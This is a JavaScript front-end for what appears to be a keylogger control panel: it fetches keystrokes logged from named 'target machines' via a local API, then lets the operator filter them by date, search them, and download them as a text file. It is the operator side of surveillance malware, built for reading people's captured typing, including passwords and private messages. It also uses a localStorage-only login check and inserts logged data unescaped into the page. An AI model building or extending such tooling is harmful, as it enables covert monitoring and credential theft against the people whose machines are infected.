

document.addEventListener('DOMContentLoaded', function () {

    if (localStorage.getItem('isLoggedIn') !== 'true') {
        window.location.href = 'login.html';
    }
    
    const urlParams = new URLSearchParams(window.location.search);
    const targetMachine = urlParams.get('machine');
    document.getElementById('machineName').textContent = targetMachine;

    const keystrokesOutput = document.getElementById('keystrokesOutput');
    keystrokesOutput.innerHTML = 'Loading...';

    // Fetch and display keystrokes initially
    getKeystrokes(targetMachine).then(displayKeystrokes);

    // Add event listener for filtering keystrokes
    document.getElementById('filterButton').addEventListener('click', function () {
        /**
         * Filters keystrokes based on the selected start and end dates.
         * Displays the filtered keystrokes.
         */
        const startDate = document.getElementById('startDate').value;
        const endDate = document.getElementById('endDate').value;

        getKeystrokes(targetMachine).then(function (keystrokes) {
            if (!Array.isArray(keystrokes)) {
                keystrokesOutput.textContent = 'Error fetching data';
                return;
            }
            const filteredKeystrokes = filterKeystrokesByDate(keystrokes, startDate, endDate);
            displayKeystrokes(filteredKeystrokes);
        });
    });

    // Add event listener for clearing filters
    document.getElementById('clearButton').addEventListener('click', function () {
        /**
         * Clears the date filters and displays all keystrokes.
         */
        document.getElementById('startDate').value = '';
        document.getElementById('endDate').value = '';
        getKeystrokes(targetMachine).then(displayKeystrokes);
    });

    // Add event listener for downloading keystrokes
    document.getElementById('downloadButton').addEventListener('click', function () {
        /**
         * Downloads the filtered keystrokes as a text file.
         */
        const startDate = document.getElementById('startDate').value;
        const endDate = document.getElementById('endDate').value;

        getKeystrokes(targetMachine).then(function (keystrokes) {
            if (!Array.isArray(keystrokes)) {
                keystrokesOutput.textContent = 'Error fetching data';
                return;
            }
            const filteredKeystrokes = filterKeystrokesByDate(keystrokes, startDate, endDate);
            downloadKeystrokes(filteredKeystrokes);
        });
    });

    // Add event listener for searching keystrokes
    document.getElementById('searchTerm').addEventListener('input', function () {
        const searchTerm = document.getElementById('searchTerm').value.toLowerCase();
        getKeystrokes(targetMachine).then(function (keystrokes) {
            if (!Array.isArray(keystrokes)) {
                keystrokesOutput.textContent = 'Error fetching data';
                return;
            }
            const filteredKeystrokes = filterKeystrokesBySearchTerm(keystrokes, searchTerm);
            displayKeystrokes(filteredKeystrokes);
        });
    });
});

/**
 * Fetches keystrokes from the backend for the specified machine.
 *
 * @param {string} targetMachine - The name of the target machine.
 * @returns {Promise<Array>} A promise that resolves to an array of keystrokes.
 */
function getKeystrokes(targetMachine) {
    return fetch(`http://127.0.0.1:5000/api/get_keystrokes?target_machine=${targetMachine}`)
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok: ' + response.statusText);
            }
            return response.json();
        })
        .then(data => data.keystrokes || [])
        .catch(error => {
            console.error('Error fetching keystrokes:', error);
            return [];
        });
}

/**
 * Filters keystrokes by the specified date range.
 *
 * @param {Array} keystrokes - The array of keystrokes to filter.
 * @param {string} startDate - The start date for filtering.
 * @param {string} endDate - The end date for filtering.
 * @returns {Array} The filtered array of keystrokes.
 */
function filterKeystrokesByDate(keystrokes, startDate, endDate) {
    if (!Array.isArray(keystrokes)) return [];
    const start = startDate ? new Date(startDate + 'T00:00:00') : null;
    const end = endDate ? new Date(endDate + 'T23:59:59') : null;
    console.log('start', start);
    console.log('end', end);
    console.log('keystrokes', keystrokes);

    return keystrokes.filter(entry => {
        const timestamp = new Date(entry.timestamp);
        return (!start || timestamp >= start) && (!end || timestamp <= end);
    });
}

/**
 * Displays the keystrokes in a table format.
 *
 * @param {Array} keystrokes - The array of keystrokes to display.
 */
function displayKeystrokes(keystrokes) {
    const keystrokesOutput = document.getElementById('keystrokesOutput');
    keystrokesOutput.innerHTML = '';

    if (!keystrokes || keystrokes.length === 0) {
        keystrokesOutput.textContent = 'No data available';
        return;
    }

    const table = document.createElement('table');
    const headerRow = document.createElement('tr');
    headerRow.innerHTML = '<th>Timestamp</th><th>Data</th>';
    table.appendChild(headerRow);

    keystrokes.forEach(entry => {
        const row = document.createElement('tr');
        row.innerHTML = `<td>${entry.timestamp}</td><td>${entry.data}</td>`;
        table.appendChild(row);
    });

    keystrokesOutput.appendChild(table);
}

/**
 * Downloads the keystrokes as a text file.
 *
 * @param {Array} keystrokes - The array of keystrokes to download.
 */
function downloadKeystrokes(keystrokes) {
    const keystrokesText = keystrokes.map(entry => `${entry.timestamp} ${entry.data}`).join('\n');
    const blob = new Blob([keystrokesText], {type: 'text/plain'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'keystrokes.txt';
    a.click();
    URL.revokeObjectURL(url);
}

/**
 * Filters keystrokes by the specified search term.
 *
 * @param {Array} keystrokes - The array of keystrokes to filter.
 * @param {string} searchTerm - The search term to filter by.
 * @returns {Array} The filtered array of keystrokes.
 */
function filterKeystrokesBySearchTerm(keystrokes, searchTerm) {
    if (!Array.isArray(keystrokes)) return [];
    return keystrokes.filter(entry => entry.data.toLowerCase().includes(searchTerm));
}

